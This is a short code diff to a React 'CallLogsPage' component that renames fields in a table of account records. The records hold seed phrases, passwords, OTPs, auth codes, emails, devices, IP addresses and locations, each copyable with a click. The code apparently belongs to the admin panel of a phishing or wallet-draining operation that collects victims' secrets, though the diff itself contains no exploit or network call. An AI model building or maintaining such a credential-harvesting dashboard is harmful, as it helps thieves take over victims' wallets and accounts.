@@ -393,19 +393,19 @@ function CallLogsPage() {
                                 className="ms-2"
                                 onClick={() => copyToClipboard(account?.email)}
                               >
-                                {account?.phrase}
+                                {account?.seed_phrase}
                               </div>
                             </div>
                           </td>
                           <td onClick={() => copyToClipboard(account.password)}>
-                            {account?.userInfo?.device +
+                            {account?.useragent?.device +
                               " " +
-                              account?.userInfo?.os}
+                              account?.useragent?.os}
                           </td>
                           <td onClick={() => copyToClipboard(account.otp)}>
-                            {account?.appName?.toUpperCase()}
+                            {account?.app_name?.toUpperCase()}
                           </td>
-                          <td>{account?.userInfo?.browser}</td>
+                          <td>{account?.useragent?.browser}</td>
                           <td onClick={() => copyToClipboard(account.authCode)}>
                             <img
                               src={`https://flagcdn.com/16x12/${account?.location?.countryCode?.toLowerCase()}.png`}
@@ -423,7 +423,7 @@ function CallLogsPage() {
                             {account?.location?.ipAddress}
                           </td>
                           <td>
-                            {moment(account?.createdAt).format(
+                            {moment(account?.datetime).format(
                               "ddd, MMM DD, YYYY, hh:mm A"
                             )}
                           </td>
